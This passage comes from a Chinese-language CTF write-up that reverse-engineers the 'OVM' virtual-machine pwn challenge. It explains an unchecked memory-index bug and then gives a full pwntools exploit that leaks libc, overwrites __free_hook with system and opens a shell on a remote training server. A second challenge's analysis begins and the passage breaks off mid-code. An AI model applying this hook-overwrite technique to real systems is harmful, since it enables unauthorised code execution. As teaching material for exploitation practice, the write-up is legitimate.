class="number">0xB</span>uLL);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%hd&quot;</span>, &amp;code_num);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( sp_ + code_num &gt; <span class="number">0x10000</span> || !code_num )</span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;EXCEPTION\n&quot;</span>, <span class="number">0xA</span>uLL);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">155</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;CODE: &quot;</span>, <span class="number">6uLL</span>);</span><br><span class="line">  running = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; code_num &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;memory[pc_ + i]);</span><br><span class="line">    <span class="keyword">if</span> ( (memory[i + pc_] &amp; <span class="number">0xFF000000</span>) == <span class="number">0xFF000000</span> )</span><br><span class="line">      memory[i + pc_] = <span class="number">0xE0000000</span>;</span><br><span class="line">    getchar();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( running )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = fetch();                               <span class="comment">// å–å½“å‰memory[pc]ä½œä¸ºæŒ‡ä»¤ï¼Œç„¶åpcè‡ªå¢1</span></span><br><span class="line">    execute(v7);</span><br><span class="line">  &#125;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;HOW DO YOU FEEL AT OVM?\n&quot;</span>, <span class="number">0x1B</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, comment, <span class="number">0x8C</span>uLL);</span><br><span class="line">  sendcomment(comment);                         <span class="comment">// free(comment</span></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Bye\n&quot;</span>, <span class="number">4uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure></div><ul><li>å…·ä½“çš„å‡½æ•°ä¸Šé¢æ‰€ç¤ºï¼Œspã€pcã€code_numã€codeéƒ½ç”±æˆ‘ä»¬è¾“å…¥ï¼Œé‡ç‚¹åœ¨äº <code>execute</code>å‡½æ•°ã€‚</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v4 = (a1 &amp; <span class="number">0xF0000</span>u) &gt;&gt; <span class="number">16</span>;</span><br><span class="line">v3 = (a1 &amp; <span class="number">0xF00</span>) &gt;&gt; <span class="number">8</span>;</span><br><span class="line">v2 = a1 &amp; <span class="number">0xF</span>;</span><br><span class="line">result = HIBYTE(a1);</span><br></pre></td></tr></table></figure></div><ul><li>å‡½æ•°å¼€å¤´å°±æœ‰è¿™äº›æ“ä½œï¼Œå¯¹è¿™äº›æ•°æ®éƒ½æ˜¯å•å­—èŠ‚çš„ï¼Œå…¶ä¸­resultæ˜¯æœ€é«˜å­—èŠ‚ï¼Œv2æœ€ä½å­—èŠ‚ï¼Œå‚è€ƒå¼€å¤´çš„å›¾ç‰‡æˆ‘ä»¬å¯ä»¥çŒœæµ‹ï¼Œv2å’Œv3æ˜¯ä½œä¸ºæºæ“ä½œæ•°çš„ï¼Œv4å°±æ˜¯ç›®çš„å¯„å­˜å™¨ï¼Œresultå°±ä½œä¸ºæŒ‡ä»¤æ¥è¿›è¡Œæ“ä½œï¼Œä¸‹é¢ç®€å•åˆ†æä¸€ä¸‹å„ä¸ªresultå¯¹åº”ä»€ä¹ˆæŒ‡ä»¤</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä¸ºäº†æ–¹ä¾¿å†™ï¼Œè®°r1,r2ä¸ºåŸæ“ä½œæ•°ï¼Œr3ä½œä¸ºç›®çš„å¯„å­˜å™¨</span></span><br><span class="line"><span class="number">0x10</span>: r3 = r1</span><br><span class="line"><span class="number">0x20</span>: r3 = (r1 == <span class="number">0</span>)</span><br><span class="line"><span class="number">0x30</span>: r3 = memory[r1]</span><br><span class="line"><span class="number">0x40</span>: memory[r1] = r3</span><br><span class="line"><span class="number">0x50</span>: push r3</span><br><span class="line"><span class="number">0x60</span>: pop r3</span><br><span class="line"><span class="number">0x70</span>: r3 = r1 + r2</span><br><span class="line"><span class="number">0x80</span>: r3 = r2 - r1</span><br><span class="line"><span class="number">0xb0</span>: r3 = r1 ^ r2</span><br><span class="line"><span class="number">0xc0</span>: r3 = r2 &lt;&lt; r1</span><br><span class="line"><span class="number">0xd0</span>: r3 = r2 &gt;&gt; r1 </span><br><span class="line"><span class="number">0xe0</span>: <span class="keyword">if</span>(!sp) <span class="built_in">exit</span></span><br><span class="line"><span class="number">0xff</span>: show(reg[]) </span><br></pre></td></tr></table></figure></div><p>é€†å‘å®Œä¹‹åå·®ä¸å¤šå¦‚ä¸Šï¼Œæ¼æ´ç‚¹å…¶å®ä¹ŸæŒºæ˜æ˜¾çš„ã€‚</p><ol><li><code>0x30</code> <code>0x40</code>ï¼Œä¸¤ä¸ªæ“ä½œä¹‹é—´æ²¡æœ‰å¯¹æ•°ç»„ä¸‹è¡¨è¿›è¡Œæ£€æŸ¥ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä»»æ„åœ°å€å†™ï¼Œæ­£å¦‚ä¹‹å‰æ‰€è¯´ï¼Œè¿™äº› <code>stack</code> <code>memory</code> <code>comment</code> <code>reg</code>æ•°ç»„éƒ½ä½äºbssæ®µä¸Šï¼Œæˆ‘ä»¬é€šè¿‡memoryæº¢å‡ºåˆ°comment[0]çš„åœ°å€ä¹‹åï¼Œç”±äºåé¢è¿˜æœ‰ä¸ªreadå‡½æ•°ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åšåˆ°ä»»æ„åœ°å€å†™ï¼ï¼ï¼</li><li>æº¢å‡ºåˆ°comment[0]ï¼Œç„¶åå†å¾€ä¸Šæœ‰freeçš„åœ°å€ï¼Œç”±äºé¢˜ç›®å¼€äº† <code>Full RELRO</code>ï¼Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥æ”¹free@gotï¼Œå› æ­¤æˆ‘ä»¬è¿˜è¦æ”¹hookå‡½æ•°çš„åœ°å€ï¼Œè§‚å¯Ÿåˆ°æœ€åçš„readæ˜¯å¾€ <code>commentåœ°å€</code>å¼€å…¥ï¼Œfree(comment)ï¼Œå¦‚æœå°† <code>free_hook-0x8</code>æ”¹ä¸ºcommentçš„åœ°å€ï¼Œç„¶åå†™å…¥ <code>b&#39;/bin/sh\x00&#39; + p64(system)</code>,é‚£ä¹ˆcommentå°±æ˜¯ bâ€™&#x2F;bin&#x2F;sh\x00â€™, free_hookå°±æ˜¯systemçš„åœ°å€ï¼Œç„¶åæ‰§è¡Œ free(comment)å°±æ˜¯ system(bâ€™&#x2F;bin&#x2F;sh\x00â€™)ï¼Œå°±getshelläº†ã€‚</li></ol><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æº¢å‡ºfree_hook<span class="number">-0x8</span>ä¸ºcommentï¼Œç„¶åè¾“å…¥b<span class="number">&#x27;</span>/bin/sh\x00<span class="number">&#x27;</span> + p64(system)</span><br><span class="line">comment -&gt; free_hook - <span class="number">0x8</span> -&gt; b<span class="number">&#x27;</span>/bin/sh\x00<span class="number">&#x27;</span></span><br><span class="line">comment+<span class="number">0x8</span> -&gt; free_hook -&gt; system</span><br></pre></td></tr></table></figure></div><ul><li>ä¸‹å›¾ä¸ºcommentä¸Šæ–¹çš„gotè¡¨ï¼Œæˆ‘ä»¬é€šè¿‡ä¿®æ”¹commentæ¥è·å¾—freeçš„ç›¸å…³åœ°å€</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x202060</span> - <span class="number">0x201F68</span> = <span class="number">248</span> </span><br><span class="line"><span class="number">248</span> / <span class="number">4</span> = <span class="number">0x3e</span> <span class="comment">// æ¯ä¸€ä¸ªä¸‹æ ‡å¯¹åº”å››å­—èŠ‚(_DWORD) </span></span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../image-20250306170003362.png" alt="image-20250306170003362"></p><ul><li>è¿˜æœ‰ä¸€ç‚¹è¦è¯´çš„ï¼Œæœ€åè¾“å…¥0xffçš„æ—¶å€™è¦æ³¨æ„ï¼Œæ¯æ¬¡éƒ½ä¼šåœ¨ä¹‹å‰è·³å…¥ä¸‹é¢ifçš„åˆ¤å®šä¸­ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼ŒåŠ¨è°ƒçš„æ—¶å€™å‘ç°çš„ï¼Œä½†æ˜¯æ§åˆ¶reg[13]ä¸ä¸º0å°±è¡Œäº†ã€‚</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../image-20250306170315453.png" alt="image-20250306170315453"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line">    <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ia</span>():</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rc   = <span class="keyword">lambda</span> num=<span class="number">4096</span>   :p.recv(num)</span><br><span class="line">ru  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">rl  = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg= <span class="keyword">lambda</span> s, num   :p.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&quot;amd64&quot;</span>,os = <span class="string">&quot;linux&quot;</span>,log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;, &#x27;new-session&#x27;, &#x27;-d&#x27;, &#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span></span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>] <span class="comment"># wsl</span></span><br><span class="line">file = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line"><span class="comment">#libc = &quot;/home/downbeat/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&quot;</span></span><br><span class="line">libc = <span class="string">&quot;/home/downbeat/CTF/buu/lib/64/libc-2.23.so&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(file)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,)</span><br><span class="line">elf = ELF(file)</span><br><span class="line">libc = ELF(libc)</span><br><span class="line"><span class="comment"># p = remote(&quot;&quot;,)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_code</span>(<span class="params">a1 , a2 , a3 , a4</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(( a1 &lt;&lt; <span class="number">24</span> ) | (((( a2 &lt;&lt; <span class="number">8</span> ) | a3) &lt;&lt; <span class="number">8</span> ) | a4))</span><br><span class="line"></span><br><span class="line"><span class="comment"># reg[13]=SP , reg[15]=PC</span></span><br><span class="line">comment = <span class="number">0x202040</span></span><br><span class="line">memory = <span class="number">0x202060</span></span><br><span class="line">reg = <span class="number">0x0242060</span></span><br><span class="line">off_mem_com = -<span class="number">0x20</span></span><br><span class="line">off_free = -<span class="number">0x3e</span> <span class="comment"># memoryä¸€ä¸ªä¸‹æ ‡å¯¹åº”å››å­—èŠ‚</span></span><br><span class="line">off_free_hook = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] - libc.sym[<span class="string">&#x27;free&#x27;</span>]  <span class="comment"># æŒ‡çš„æ˜¯freeå’Œfree_hookçš„åç§»</span></span><br><span class="line">lg(<span class="string">&quot;off_free_hook to free: &quot;</span>,off_free_hook)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿˜éœ€æ³¨æ„ï¼Œå˜é‡å®šä¹‰çš„æ˜¯_DWORDï¼Œå±äº32ä½æ— ç¬¦å·æ•´æ•°</span></span><br><span class="line"><span class="comment"># ä¸‹é¢å…ˆè·å¾—freeçš„åœ°å€,reg[1],reg[2]</span></span><br><span class="line">code = [</span><br><span class="line">    my_code(<span class="number">0x10</span> , <span class="number">10</span>, <span class="number">0</span>, <span class="number">0x3f</span>), <span class="comment"># reg[10] = 0x3f</span></span><br><span class="line">    my_code(<span class="number">0x10</span> , <span class="number">11</span> , <span class="number">0</span> , <span class="number">0x1</span>),<span class="comment"># reg[11] = 0x1</span></span><br><span class="line">    my_code(<span class="number">0x80</span> , <span class="number">10</span> , <span class="number">11</span> , <span class="number">10</span>),<span class="comment"># reg[10] = -0x3e</span></span><br><span class="line">    my_code(<span class="number">0x30</span> , <span class="number">1</span> , <span class="number">0</span> , <span class="number">10</span>),  <span class="comment"># reg[1] = freeä½å››å­—èŠ‚</span></span><br><span class="line">    my_code(<span class="number">0x70</span> , <span class="number">10</span> , <span class="number">10</span> , <span class="number">11</span>),<span class="comment"># reg[10] = -0x3d</span></span><br><span class="line">    my_code(<span class="number">0x30</span> , <span class="number">2</span> , <span class="number">0</span> , <span class="number">10</span>),  <span class="comment"># reg[2] = freeçš„é«˜å››å­—èŠ‚</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># reg[3]ä¸ºfree_hookåœ°å€</span></span><br><span class="line">    my_code(<span class="number">0x10</span> , <span class="number">5</span> , <span class="number">0</span> , <span class="number">0x8</span>),<span class="comment"># reg[5] = 0x8</span></span><br><span class="line">    my_code(<span class="number">0x10</span> , <span class="number">3</span> , <span class="number">0</span> , (off_free_hook &amp; <span class="number">0xff</span>)),<span class="comment"># reg[3] = æœ€ä½å­—èŠ‚</span></span><br><span class="line">    my_code(<span class="number">0x10</span> , <span class="number">4</span> , <span class="number">0</span> , (off_free_hook &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>),<span class="comment"># reg[4] = ä¸­é—´å­—èŠ‚</span></span><br><span class="line">    my_code(<span class="number">0xc0</span> , <span class="number">4</span> , <span class="number">4</span> , <span class="number">5</span>),<span class="comment"># reg[4] &lt;&lt; 8</span></span><br><span class="line">    my_code(<span class="number">0x70</span> , <span class="number">3</span> , <span class="number">3</span> , <span class="number">4</span>),<span class="comment"># reg[3] += reg[4],å¾—åˆ°ä¸­é—´å’Œæœ€ä½å­—èŠ‚</span></span><br><span class="line">    my_code(<span class="number">0x10</span> , <span class="number">5</span> , <span class="number">0</span> , <span class="number">0x10</span>),<span class="comment"># reg[5] = 0x10</span></span><br><span class="line">    my_code(<span class="number">0x10</span> , <span class="number">4</span> , <span class="number">0</span> , (off_free_hook &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>),<span class="comment"># reg[4] = æœ€é«˜å­—èŠ‚</span></span><br><span class="line">    my_code(<span class="number">0xc0</span> , <span class="number">4</span> , <span class="number">4</span> , <span class="number">5</span>),<span class="comment"># reg[4] &lt;&lt; 16</span></span><br><span class="line">    my_code(<span class="number">0x70</span> , <span class="number">3</span> , <span class="number">3</span> , <span class="number">4</span>),<span class="comment"># reg[3] ä¸ºfree_hookåç§»åœ°å€</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># å°†commentæ”¹ä¸ºfree_hook-0x8ï¼Œè¾“å…¥/bin/sh+system</span></span><br><span class="line">    <span class="comment"># free(comment) -&gt; system(&#x27;/bin/sh&#x27;)</span></span><br><span class="line">    my_code(<span class="number">0x70</span> , <span class="number">1</span> , <span class="number">1</span> , <span class="number">3</span>),   <span class="comment"># reg[1]+=reg[3],å³reg[1]æ˜¯free_hookçš„ä½å››å­—èŠ‚åœ°å€</span></span><br><span class="line">    my_code(<span class="number">0x10</span> , <span class="number">10</span> , <span class="number">0</span> , <span class="number">0x8</span>),<span class="comment"># reg[10]=8 , ä¸ºäº†æ”¹commentä¸ºfree_hook-0x8</span></span><br><span class="line">    my_code(<span class="number">0x80</span> , <span class="number">1</span> , <span class="number">1</span> , <span class="number">10</span>),  <span class="comment"># reg[1]-=8,fre_hookä½ä½åœ°å€-8</span></span><br><span class="line">    my_code(<span class="number">0x10</span> , <span class="number">10</span>, <span class="number">0</span>, <span class="number">0x9</span>),  <span class="comment"># reg[10] = 0x9</span></span><br><span class="line">    my_code(<span class="number">0x10</span> , <span class="number">11</span> , <span class="number">0</span> , <span class="number">0x1</span>),<span class="comment"># reg[11] = 0x1</span></span><br><span class="line">    my_code(<span class="number">0x80</span> , <span class="number">10</span> , <span class="number">11</span> , <span class="number">10</span>),<span class="comment"># reg[10] = -0x8</span></span><br><span class="line">    my_code(<span class="number">0x40</span> , <span class="number">1</span> , <span class="number">0</span> , <span class="number">10</span>),  <span class="comment"># commenté«˜ä½ = free_hookä½å››å­—èŠ‚-0x8</span></span><br><span class="line">    my_code(<span class="number">0x70</span> , <span class="number">10</span> , <span class="number">10</span> , <span class="number">11</span>), <span class="comment"># reg[10] = -0x7</span></span><br><span class="line">    <span class="comment"># bug()</span></span><br><span class="line">    my_code(<span class="number">0x40</span> , <span class="number">2</span> , <span class="number">0</span> , <span class="number">10</span>),  <span class="comment"># commentä½ä½ = free_hooké«˜å››å­—èŠ‚-0x8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># è·å¾—libc</span></span><br><span class="line">    my_code(<span class="number">0x10</span> , <span class="number">13</span> , <span class="number">0</span> , <span class="number">1</span>), <span class="comment"># reg[13] = 1</span></span><br><span class="line">    my_code( <span class="number">0xFF</span> , <span class="number">0</span> , <span class="number">0</span> , <span class="number">0</span>)  <span class="comment"># è¾“å‡ºæ³„éœ²libc</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;PC: &quot;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">sla(<span class="string">&quot;SP: &quot;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">sla(<span class="string">&quot;CODE SIZE: &quot;</span>,<span class="string">b&#x27;26&#x27;</span>)</span><br><span class="line">ru(<span class="string">&quot;CODE: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> code:</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    sl(i.encode())</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;R1: &#x27;</span>)</span><br><span class="line">free_hook_low = <span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>) + <span class="number">8</span></span><br><span class="line">ru(<span class="string">b&#x27;R2: &#x27;</span>)</span><br><span class="line">free_hook_high = <span class="built_in">int</span>(p.recv(<span class="number">4</span>), <span class="number">16</span>) &lt;&lt; <span class="number">32</span></span><br><span class="line">free_hook_addr = free_hook_high | free_hook_low</span><br><span class="line">libc.address = free_hook_addr - libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>]  </span><br><span class="line">lg(<span class="string">&quot;libc.address: &quot;</span>,libc.address)</span><br><span class="line">lg(<span class="string">&quot;system: &quot;</span>,system)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(system)</span><br><span class="line">sla(<span class="string">&quot;HOW DO YOU FEEL AT OVM?\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure></div><h2 id="2025GHCTF"><a href="#2025GHCTF" class="headerlink" title="2025GHCTF"></a>2025GHCTF</h2><ul><li>å…ˆçœ‹ä¸»å‡½æ•°ï¼š</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int16 v4; <span class="comment">// [rsp+Ch] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 v5; <span class="comment">// [rsp+Eh] [rbp-12h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 code_num; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 i; <span class="comment">// [rsp+12h] [rbp-Eh]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  funcptr = my_print;                           <span class="comment">// æŒ‡å‘ä¸€ä¸ªå‡½æ•°</span></span><br><span class="line">  init();</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;This is my vm.\n&quot;</span>, <span class="number">0xF</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;set your IP:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%hd&quot;</span>, &amp;v4);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;set your SP:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%hd&quot;</span>, &amp;v5);</span><br><span class="line">  getchar();</span><br><span class="line">  SP_ = v5;</span><br><span class="line">  IP_ = v4;</span><br><span class="line">  <span class="keyword">if</span> ( v4 &gt; <span class="number">0x2000</span>u || !v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;How much code do you want to execve:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%hd&quot;</span>, &amp;code_num);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; code_num; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, <span class="number">4LL</span> * i + <span class="number">0x6020E0</span>);   <span class="comment">// 0x6020E0å¯¹åº”memory,å³ä»memoryå¼€å§‹å†™æŒ‡ä»¤</span></span><br><span class="line">    getchar();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; code_num; ++i )</span><br><span class="line">  &#123;</span><br><span 